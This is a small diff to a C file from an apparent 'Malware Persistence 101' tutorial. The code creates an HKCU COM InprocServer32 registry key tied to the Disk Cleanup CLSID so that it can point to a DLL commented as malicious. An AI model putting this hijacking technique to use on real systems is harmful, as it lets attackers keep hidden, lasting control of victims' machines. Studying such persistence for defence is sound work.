@@ -1,6 +1,6 @@
 /*
  * Malware Persistence 101
- * pers.cpp
+ * pers.c
  * windows persistence via Disk Cleaner
  * author: @cocomelonc
 */
@@ -15,7 +15,7 @@ int main(int argc, char* argv[]) {
   const char* sk = "Software\\Classes\\CLSID\\{8369AB20-56C9-11D0-94E8-00AA0059CE02}\\InprocServer32";
 
   // malicious DLL
-  const char* dll = "Z:\\malware-persistence-101\\05\\hack.dll";
+  const char* dll = "Z:\\hack.dll";
 
   // startup
   LONG res = RegCreateKeyEx(HKEY_CURRENT_USER, (LPCSTR)sk, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_QUERY_VALUE, NULL, &hkey, NULL);
